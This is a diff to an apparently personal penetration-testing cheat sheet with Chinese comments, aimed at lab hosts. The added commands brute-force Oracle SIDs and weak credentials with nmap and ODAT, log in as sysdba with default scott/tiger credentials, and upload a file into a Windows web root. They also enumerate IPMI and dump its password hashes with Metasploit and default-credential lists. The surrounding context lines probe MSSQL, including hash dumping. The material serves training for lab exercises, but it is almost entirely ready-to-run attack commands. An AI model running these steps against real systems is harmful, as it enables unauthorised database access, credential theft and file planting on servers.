@@ -118,3 +118,34 @@ cat /etc/mysql/mysql.conf.d/mysqld.cnf | grep -v "#" | sed -r '/^\s*$/d'
 nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248
 # 使用 mssqlclient 连接到 MSSQL 服务器，-windows-auth 表示使用 Windows 身份验证，-target-ip 指定目标 IP 地址，-username 和 -password 分别指定用户名和密码
 python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth
+
+# ORACLE TNS服务探测 / SID 枚举
+sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
+# Oracle 渗透利用框架，爆破 TNS Listener 和 Oracle 数据库的弱口令
+./odat.py all -s 10.129.204.235
+# 连接oracle数据库
+sqlplus scott/tiger@10.129.204.235/XE
+# 报错;sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory
+sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
+# 直接枚举sysdba权限
+sqlplus scott/tiger@10.129.204.235/XE as sysdba
+# 上传文件到oracle服务器上
+./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
+
+# IPMI (Intelligent Platform Management Interface) 是一种用于远程管理计算机系统的标准接口，通常用于服务器管理。
+# 使用 nmap 的 ipmi-version 脚本检测 IPMI 服务的版本信息
+sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local
+
+# MFS枚举IPMI
+use auxiliary/scanner/ipmi/ipmi_version
+ set rhosts 10.129.42.195
+ show options
+ run
+
+# MFS IPMI爆破
+use auxiliary/scanner/ipmi/ipmi_dumphashes 
+    set rhosts
+    set user_file /opt/useful/seclists/Discovery/Default-Credentials/ipmi-user.txt
+    set pass_file /opt/useful/seclists/Discovery/Default-Credentials/ipmi
+    show options
+    run
